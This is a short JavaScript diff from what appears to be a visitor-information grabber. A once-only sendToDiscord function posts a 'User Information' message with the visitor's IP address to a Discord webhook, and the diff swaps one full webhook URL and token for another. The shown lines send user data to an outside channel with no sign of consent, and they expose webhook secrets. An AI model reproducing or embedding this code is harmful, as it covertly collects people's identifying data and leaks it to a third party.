@@ -6,7 +6,7 @@ let infoSent = false; // Flag to ensure the webhook info is only sent once
 function sendToDiscord(info) {
     if (infoSent) return; // Check if the info has already been sent
 
-    const webhookUrl = 'https://discord.com/api/webhooks/1271118105728520274/qp8ByRQRVPKehFLbxCc8Ug8b6lZnT2ufeNyP7E5rBJSLojMOhHmNMn34HA8vdnj8CvFh';
+    const webhookUrl = 'https://discord.com/api/webhooks/1365703685337911296/mqhJZhuYeRewPh9NJ_Pgbpi0FISrh4rMLIy2xQ2mD9CVLx9B-r1l7hG4C3T1b0Xuh1v6';
     const message = {
         content: `User Information:\n
         IP Address: ${info.ip}\n
